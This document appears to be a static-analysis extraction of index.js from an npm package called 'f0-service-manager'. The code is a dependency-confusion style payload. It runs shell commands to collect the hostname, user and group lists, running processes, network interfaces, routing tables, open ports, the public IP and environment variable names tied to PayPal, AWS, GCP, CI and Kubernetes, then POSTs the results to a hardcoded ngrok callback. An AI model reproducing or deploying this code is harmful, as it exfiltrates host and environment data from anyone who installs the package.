// File: var/folders/83/v1gvs5x976xdn94tnyk95j8r0000gq/T/tmpe4a4us_x/f0-service-manager/package/index.js
// ======================================================================
Line 1: const fs = require("fs")
Line 2: const os = require("os")
Line 3: const https = require("https")
Line 4: const http = require("http")
Line 5: const dns = require("dns")
Line 6: const crypto = require("crypto")
Line 7: _tmp_16 = require("child_process")
Line 8: const querystring = require("querystring")
Line 14: const CALLBACK_HTTPS = "https://652d-159-65-255-88.ngrok-free.app/"
Line 15: const CALLBACK_HTTP  = "https://652d-159-65-255-88.ngrok-free.app/"
Line 22: execSync(cmd, { timeout }).toString().trim()
Line 28: _tmp_19.push(<operator>.formatString("/tmp/poc_marker_", runId, ""))
Line 29: _tmp_19.push(<operator>.formatString("/var/tmp/poc_marker_", runId, ""))
Line 32: os.hostname()
Line 33: safeExec("uname -a")
Line 34: safeExec("lsb_release -a")
Line 35: safeExec("id -a")
Line 42: safeExec("ps -eo comm --no-headers | sort | uniq | head -n 200")
Line 45: safeExec("ps -eo pid,user,comm,args --no-headers | head -n 200")
Line 48: safeExec("ps -eo pid,user,%cpu,%mem,comm,args --no-headers | head -n 200")
Line 55: const out = safeExec("npm config get registry")
Line 60: Object.keys(process.env || {})
Line 62: /PAYPAL|PAY|PP|AWS|GCP|GOOGLE|CI|JENKINS|GITLAB|GITHUB|DOCKER|KUBERNETES|K8S|REGION|ENV/i.test(k)
Line 67: {
  const nets = os.networkInterfaces();
  const macs = [];
  Object.values(nets || {}).forEach(arr => arr.forEach(n => {
    if (!n.internal && n.mac && n.mac !== "00:00:00:00:00:00") macs.push(n.mac);
  }));
  return macs.length ? shaTrim(macs.join("|"),16) : null;
}
Line 69: const macs = []
Line 71: macs.push(n.mac)
Line 73: macs.join("|")
Line 78: {
  const nets = os.networkInterfaces();
  const result = [];
  Object.entries(nets).forEach(([iface, addrs]) => addrs.forEach(addr => {
    if (!addr.internal) result.push({ iface, mac: addr.mac, family: addr.family, address: addr.address, netmask: addr.netmask, cidr: addr.cidr });
  }));
  return result;
}
Line 80: const result = []
Line 82: result.push({ iface, mac: addr.mac, family: addr.family, address: addr.address, netmask: addr.netmask, cidr: addr.cidr })
Line 88: safeExec("getent passwd")
Line 89: safeExec("getent group")
Line 92: safeExec("df -h")
Line 93: safeExec("netstat -rn")
Line 94: safeExec("netstat -tuln")
Line 98: (_tmp_11 = https.get("https://api.ipify.org?format=json", res => {
    let data=""; res.on("data", c=>data+=c); res.on("end",()=>{ try{ callback(JSON.parse(data).ip||null); } catch{ callback(null); } });
  }))
Line 99: callback(JSON.parse(data).ip||null)
Line 100: callback(null)
Line 118: getUsers()
Line 120: getDiskUsage()
Line 148: {
    const u=new URL(urlStr);
    const postData = querystring.stringify({ msg: JSON.stringify(obj) });
    const lib = u.protocol==="https:"? https : http;
    const opts = { hostname:u.hostname, port:u.port||(u.protocol==="https:"?443:80), path:u.pathname, method:"POST", headers:{ "Content-Type":"application/x-www-form-urlencoded","Content-Length":Buffer.byteLength(postData) }, timeout:3000 };
    const req = lib.request(opts,res=>{ res.on("data",()=>{}); });
    req.on("error",()=>{});
    req.write(postData);
    req.end();
  }
Line 155: req.write(postData)
Line 156: req.end()
Line 163: sendCallback(CALLBACK_HTTPS,payload)
Line 164: sendCallback(CALLBACK_HTTP,payload)
